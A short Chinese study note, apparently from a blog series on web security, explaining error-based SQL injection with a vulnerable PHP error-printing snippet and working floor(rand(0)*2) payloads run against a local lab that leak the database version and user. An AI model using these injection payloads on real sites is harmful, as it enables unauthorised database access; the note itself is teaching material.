---
layout: post
title: "SQL注入-报错注入"
date: 2018-06-16
category: web安全
tags: web安全 sql注入 web安全进阶笔记
---

## 报错注入

### 01 报错注入原理

构造payload让信息通过错误提示回显出来  
应用场景：  
查询不回显内容，会打印错误信息  
Update、insert等语句，会打印错误信息  

	if($row)
	{
		echo 'Your Login name:'.$row['username'];
	}
	else
	{
		print_r(mysql_error());
	}

### 02 报错注入方法

	select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+

	http://127.0.0.1:90/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+


报错注入只有32位长 




